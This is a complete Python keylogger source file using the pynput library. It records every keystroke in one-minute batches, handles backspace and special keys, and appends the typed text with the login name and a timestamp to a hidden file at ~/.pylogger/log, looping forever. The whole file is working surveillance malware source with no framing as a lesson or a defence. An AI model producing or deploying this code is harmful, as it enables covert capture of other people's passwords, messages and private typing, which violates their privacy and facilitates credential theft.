from time import sleep, asctime, localtime
from os import getlogin, mkdir, environ
from os.path import exists
from pynput import keyboard

log = []

def on_press(key):
    special_lookup = {
        "Key.space": " ",
        "Key.tab": " ",
        "Key.enter": "<ENTER>",
        "Key.delete": "<DELETE>"
    }
    try:
        log.append(key.char)
    except AttributeError:
        if str(key) == "Key.backspace":
            try:
                log.pop()
            except IndexError:
                log.append("<BACKSPACE>")
        elif str(key) in special_lookup.keys():
            log.append(special_lookup[str(key)])

def check_make_directory(dir_path):
    if not exists(dir_path):
        mkdir(dir_path)

def append_line(filepath, line):
    with open(filepath, 'a') as the_file:
        the_file.write(f"{line}\n")

if __name__ == "__main__":
    log_dir = f"{environ['HOME']}/.pylogger"
    log_file = f"{log_dir}/log"
    check_make_directory(log_dir)
    while True:
        log = []
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        sleep(60)
        listener.stop()
        log_line = f"{getlogin()} -- {asctime(localtime())}: {''.join(log)}"
        append_line(log_file, log_line)
